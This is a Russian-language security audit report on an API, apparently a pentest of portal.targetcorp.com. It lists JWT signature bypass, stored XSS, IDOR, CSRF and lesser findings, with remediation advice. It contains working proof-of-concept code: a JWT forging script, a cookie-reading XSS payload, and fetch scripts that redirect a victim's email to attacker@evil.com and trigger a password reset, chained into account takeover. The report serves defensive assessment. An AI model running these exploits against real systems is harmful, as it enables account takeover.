# Содержание
- [Содержание](#содержание)
- [Резюме](#резюме)
- [Технические детали](#технические-детали)
  - [High](#high)
    - [**F-H-1. Обход верификации подписи JWT**](#f-h-1-обход-верификации-подписи-jwt)
  - [Medium](#medium)
    - [**F-M-1. Stored XSS в `/api/v1/profile`**](#f-m-1-stored-xss-в-apiv1profile)
    - [**F-M-2. Избыточное раскрытие данных / IDOR в `/api/v1/profile/{id}`**](#f-m-2-избыточное-раскрытие-данных--idor-в-apiv1profileid)
    - [**F-M-3. CSRF при смене почты в `/api/v1/account/change-email`**](#f-m-3-csrf-при-смене-почты-в-apiv1accountchange-email)
  - [Low](#low)
    - [**F-L-1. Использование предсказуемых ID пользователей**](#f-l-1-использование-предсказуемых-id-пользователей)
    - [**F-L-2. Отсутствие времени жизни JWT**](#f-l-2-отсутствие-времени-жизни-jwt)
  - [Informational](#informational)
    - [**F-I-1. Раскрытие типа серверного фреймворка через заголовок `X-Powered-By` в `/profile/{id}`**](#f-i-1-раскрытие-типа-серверного-фреймворка-через-заголовок-x-powered-by-в-profileid)
- [Цепочка эксплуатации на примере захвата аккаунта](#цепочка-эксплуатации-на-примере-захвата-аккаунта)
  - [Без взаимодействия с жертвой (JWT)](#без-взаимодействия-с-жертвой-jwt)
  - [При взаимодействии с жертвой (CSRF)](#при-взаимодействии-с-жертвой-csrf)


# Резюме
В ходе анализа сценариев API были обнаружены и классифицированы по критичности следующие уязвимости:

| Уязвимость                                                                                   | Критичность   |
| -------------------------------------------------------------------------------------------- | ------------- |
| F-H-1. Обход верификации подписи JWT                                                         | High          |
| F-M-1. Stored XSS в `/api/v1/profile`                                                        | Medium        |
| F-M-2. Избыточное раскрытие данных / IDOR в `/api/v1/profile/{id}`                           | Medium        |
| F-M-3. CSRF при смене почты в `/api/v1/account/change-email`                                 | Medium        |
| F-L-1. Использование предсказуемых ID пользователей                                          | Low           |
| F-L-2. Отсутствие времени жизни JWT                                                          | Low           |
| F-I-1. Раскрытие типа серверного фреймворка через заголовок `X-Powered-By` в `/profile/{id}` | Informational |

| Critical | High | Medium | Low | Informational |
| -------- | ---- | ------ | --- | ------------- |
| 0        | 1    | 3      | 2   | 1             |

**Краткие выводы**: в ходе анализа API был выявлен низкий уровень защищенности. Основные проблемы кроются в некорректной реализации механизмов авторизации (JWT) и недостаточной защите от межсайтовых атак (XSS, CSRF). Данные уязвимости позволяют скомпрометировать любую учетную запись.
# Технические детали
## High
### **F-H-1. Обход верификации подписи JWT**
#### Классификации
- CWE: CWE-347 - Improper Verification of Cryptographic Signature`
- OWASP: A04:2025 - Cryptographic Failures
- Критичности: High
#### Описание
Для авторизации действий (контроля доступа) API использует JWT (JSON Web Token) - токен авторизации, который указывается в Cookie в значении `session`.

**Технические данные**:
- Токен представлен в формате: `<header>.<body>.<signature>`, где `<signature> = xYz123`.
- Используемый алгоритм: `HS256`.
- Передаваемые в теле токена поля: `uid`, `username`, `role`.

В приложении реализована некорректная проверка подписи JWT.

В данном случае подпись статична и равна строке `xYz123`, из чего можно сделать вывод, что проверка не производится.

Правильный вариант вычисления подписи (псевдокод):
```
data = to_b64Url(header) + "." + to_b64Url(body)
hashed = HS256(data)
signature = to_b64Url(hashed)
```
#### PoC
Скрипт на JS для генерации JWT (запускать из консоли браузера):
```js
(() => {
	let _ = (obj) => btoa(JSON.stringify(obj));
    let header = _({
	    "alg": "HS256"
	});
    let body = _({
	    "uid": prompt("uid:"),
	    "username": prompt("username:"),
	    "role": prompt("role:")
    });
    let signature = "xYz123";

    return `${header}.${body}.${signature}`;
})()
```
#### Риски
- **Impersonation Attack**: атака с использованием подмены личности через подмену параметров `uid` и `username`.
- **Privilege Escalation**: повышение привилегий через подмену параметра `role`.
#### Рекомендации по устранению
- При реализации JWT использовать стандарты RFC 7519, 7515, 7517.
- Опираться на лучшие практики безопасности JWT: RFC 8725
- Использовать готовые и проверенные временем реализации JWT (например для Node.js - jsonwebtoken)
## Medium
### **F-M-1. Stored XSS в `/api/v1/profile`**
#### Классификации
- CWE: CWE-79 - Improper Neutralization of Input During Web Page Generation
- OWASP: A05:2025 - Injection
- Критичности: Medium
#### Описание
Неправильная обработка пользовательского ввода при обновлении отображаемого имени `display_name` в профиле пользователя через `/api/v1/profile` влечет за собой возможность эксплуатации Stored XSS.
#### PoC
Получение Cookie пользователя:
```http
POST /api/v1/profile HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=<DELETED>
Content-Type: application/json
Origin: https://portal.targetcorp.com
 
{"display_name": "<img src='' onerror='console.log(document.cookie)'>", "bio": "BIO"}
```
#### Риски
- Компрометация данных пользователя
- Выполнение действий от имени другого пользователя
- Порча сайта (defacing)
#### Рекомендации по устранению
- Экранирование данных (например, использование HTML-сущностей)
- Валидация данных (например, регулярные выражение, такие как `[a-zA-Z]+` и т.д.)
- Фильтрация (удаление опасных символов, таких как `>`, `<` и т.д.)
- Использование CSP (Content Security Policy)
- Использование библиотек и фреймворков с готовыми решениями (например, React, Angular)
### **F-M-2. Избыточное раскрытие данных / IDOR в `/api/v1/profile/{id}`**
#### Классификации
- CWE:
	- CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor
	- CWE-639 - Authorization Bypass Through User-Controlled Key
- OWASP: A01:2025 - Broken Access Control
- Критичности: Medium
#### Описание
Доступ к профилю другого пользователя через `/api/v1/profile/{id}` позволяет получить чувствительную/избыточную информацию.
#### PoC
Запрос пользователя с ID `{id}`:
```http
GET /api/v1/profile/{id} HTTP/1.1
Host: portal.targetcorp.com
Cookie: session=<DELETED>
```
Раскрывает данные: `uid`, `username`, `email`, `role`, `display_name`, `last_login`, где `email` и `last_login` - чувствительные.
#### Риски
- Нарушение конфиденциальности
- Связи с другими уязвимостями
#### Рекомендации по устранению
- Убрать из возвращаемых значений метода избыточные поля.
### **F-M-3. CSRF при смене почты в `/api/v1/account/change-email`**
#### Классификации
- CWE: CWE-352 - Cross-Site Request Forgery
- OWASP: A01:2025 - Broken Access Control
- Критичности: Medium
#### Описание
Отсутствие корректно настроенной политики CORS: наличие лишних доменов в заголовке `Access-Control-Allow-Origin` и заголовок `Access-Control-Allow-Credentials` со значением `true` (предположительно динамическая рефлексия Origin) приводят к тому, что злоумышленник может без ведома пользователя сменить его почту через `/api/v1/account/change-email`.
#### PoC
1) Создать сайт со скриптом такого вида:

    ```js
    let attackerMail = "attacker@evil.com";
    fetch('https://portal.targetcorp.com/api/v1/account/change-email', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `new_email=${attackerMail}`,
            credentials: 'include'
        })
    .then(response => response.json())
    .then(data => console.log(data))
    .catch(error => console.error(error));
    ```
где `attacker@evil.com` - почта атакующего

2) Заставить жертву кликнуть по ссылке с переходом на вредоносный сайт.
#### Риски
- Смена почты пользователя
- Захват аккаунта через цепочку уязвимостей
#### Рекомендации по устранению
- Использовать белый список доверенных источников
- Реализовывать серверную проверку Origin
- Минимизировать использование `Access-Control-Allow-Credentials: true`
## Low
### **F-L-1. Использование предсказуемых ID пользователей**
#### Классификации
- CWE: CWE-340 - Generation of Predictable Numbers or Identifiers
- OWASP: A04:2025 - Cryptographic Failures
- Критичности: Low
#### Описание
Для идентификации пользователей приложение использует предсказуемые идентификаторы, в данном случае обычные числа: `1, 2, 3, 4, ...`.
#### Риски
- Возможность перечисления пользователей для сбора данных.
#### Рекомендации по устранению
- Использовать более сложные, непредсказуемые идентификаторы (например UUID)
### **F-L-2. Отсутствие времени жизни JWT** 
#### Классификации
- CWE: CWE-613 - Insufficient Session Expiration
- OWASP: A07:2025 - Authentication Failures
- Критичности: Low
#### Описание
Любой сформированный JWT может использоваться вечно.
#### Риски
- Неограниченный доступ при компрометации токена.
- Отсутствие механизма отзыва.
#### Рекомендации по устранению
- Использование схемы Access и Refresh токенов.
## Informational
### **F-I-1. Раскрытие типа серверного фреймворка через заголовок `X-Powered-By` в `/profile/{id}`**
#### Классификации
- CWE: CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor
- OWASP: A01:2025 - Broken Access Control
- Критичности: Informational
#### Описание
Приложение раскрывает тип фреймворка (`Express.js`), используемого на серверной стороне через заголовок ответа `X-Powered-By` при посещении ресурсов `/profile/{id}` (как минимум):
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Powered-By: Express
 
<!DOCTYPE html>
...
```
#### Риски
- Облегчение работы злоумышленника в разведке и поиске эксплойтов.
#### Рекомендации по устранению
- Сконфигурировать веб-серверы, убрав заголовок `X-Powered-By`.
# Цепочка эксплуатации на примере захвата аккаунта
## Без взаимодействия с жертвой (JWT)
Цепочка действий:
1) Перечисляем ID, получая информацию об аккаунтах через `/api/v1/profile/{id}` и находим интересующий нас. Получаем нужную информацию: `uid`, `username`, `role`.
2) Фальсифицируем токен JWT с использованием данных жертвы (хотя на данном этапе мы уже получили доступ к аккаунту, дальше мы произведем закрепление).
3) Меняем почту на свою через `/api/v1/account/change-email`.
4) Получаем ссылку восстановления пароля на аккаунте жертвы через `/api/v1/account/reset-password`.
5) Переходим по ссылке на почте и меняем пароль.
## При взаимодействии с жертвой (CSRF)
Цепочка действий:
1) Создаем сайт, эксплуатирующий уязвимость CSRF при смене почты в `/api/v1/account/change-email`.
   Также добавляем на сайт логику, которая после смены почты отправит запрос на получение ссылки восстановления пароля через `/api/v1/account/reset-password`.
   Пример скрипта на странице:
    ```js
    async function attack() {
        let attackerMail = "attacker@evil.com";
        await fetch('https://portal.targetcorp.com/api/v1/account/change-email', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `new_email=${attackerMail}`,
            credentials: 'include'
        });

        await fetch('https://portal.targetcorp.com/api/v1/account/reset-password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: `${attackerMail}` })
        });
    }

    attack();
    ```

2) Заставляем пользователя перейти на сайт.
3) Переходим по ссылке на почте и меняем пароль.